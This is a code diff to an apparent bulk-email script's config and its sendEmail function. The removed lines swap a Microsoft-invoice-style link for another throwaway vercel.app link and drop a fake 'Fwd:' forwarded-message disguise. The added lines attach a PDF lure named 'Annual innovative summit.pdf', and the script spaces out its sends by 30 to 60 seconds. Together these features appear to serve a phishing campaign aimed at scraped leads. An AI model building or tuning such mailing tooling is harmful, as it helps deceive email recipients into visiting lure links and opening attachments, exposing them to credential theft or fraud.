@@ -462,7 +462,7 @@ manualCountryCodesForSearch: [
 
   emailDelay: { min: 30000, max: 60000 }, // 30 to 60 seconds
   emailLinks: [
-    "https://microsoftinvoice2025financialreport.vercel.app/",
+    "https://orchidinnovativesummit894-por.vercel.app/",
   ],
   defaultCountryCode: null, // Set to a country code like 'US', 'GB', etc., to filter searches by country. Set to null for global search.
   defaultDialingCode: null, // Set to a dialing code like '+1', '+44', etc., to filter searches by dialing code. Set to null for no dialing code filter.
@@ -1042,43 +1042,19 @@ async function sendEmail(to, lead, leadSenderName) {
     htmlContent = htmlContent.replace('{sender_name}', leadSenderName);
   }
 
-  // Construct the original email's subject and body
-  const originalSubject = 'Hello from ' + leadSenderName + ' at ' + (lead && lead.companyName ? lead.companyName : 'our company');
-  const originalFrom = fromAddress;
-  const originalTo = to;
-  const originalDate = new Date().toUTCString();
-
-  // Apply quoted-printable encoding to the HTML content for the embedded message
-  const encodedHtmlContent = htmlContent.replace(/=/g, '=3D').replace(/\r?\n/g, '=0D=0A');
-
-  // Construct the raw RFC 822 message for the original email
-  const rawOriginalMessage = [
-    `From: ${originalFrom}`,
-    `To: ${originalTo}`,
-    `Subject: ${originalSubject}`,
-    `Date: ${originalDate}`,
-    `MIME-Version: 1.0`,
-    `Content-Type: text/html; charset="utf-8"`,
-    `Content-Transfer-Encoding: quoted-printable`,
-    '', // Empty line separates headers from body
-    encodedHtmlContent
-  ].join('\r\n');
+  // Construct the email's subject and body for direct sending
+  const subject = 'Hello from ' + leadSenderName + ' at ' + (lead && lead.companyName ? lead.companyName : 'our company');
 
   const mailOptions = {
-    from: fromAddress, // The sender of the *forwarded* email
+    from: fromAddress,
     to: to,
-    subject: `Fwd: ${originalSubject}`, // Add Fwd: to the subject of the forwarding email
-    html: `---------- Forwarded message ---------<br>
-From: ${originalFrom}<br>
-Date: ${originalDate}<br>
-Subject: ${originalSubject}<br>
-To: ${originalTo}<br>
-<br>
-`, // Introductory text for the forwarding email
+    subject: subject,
+    html: htmlContent,
     attachments: [
       {
-        contentType: 'message/rfc822',
-        raw: rawOriginalMessage
+        filename: 'Annual innovative summit.pdf',
+        path: path.join(__dirname, 'Annual innovative summit.pdf'),
+        contentType: 'application/pdf'
       }
     ],
     replyTo: (lead && lead.sender && lead.sender.email) ? lead.sender.email : undefined,
